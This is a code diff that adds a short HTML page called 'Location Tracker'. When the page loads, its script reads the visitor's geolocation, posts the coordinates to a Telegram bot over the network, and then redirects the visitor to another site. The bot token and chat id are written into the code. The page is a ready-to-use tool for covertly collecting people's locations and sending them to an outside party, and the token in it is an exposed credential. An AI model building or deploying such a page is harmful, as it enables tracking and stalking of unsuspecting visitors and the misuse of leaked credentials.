@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Tracker</title>
+    <script>
+        function sendLocation(lat, lon) {
+            let botToken = "7565350828:AAFpNkY7a3JA2BiYwho2UkHaNMt3JvHuuvM";
+            let chatId = "7761537273";
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=User%20Location:%20${lat},${lon}`;
+            fetch(url);
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+                        sendLocation(lat, lon);
+                        window.location.href = "https://example.com"; // Redirect
+                    },
+                    (error) => {
+                        alert("Location access denied.");
+                    }
+                );
+            } else {
+                alert("Geolocation is not supported.");
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <h1>Tracking your location...</h1>
+</body>
+</html>
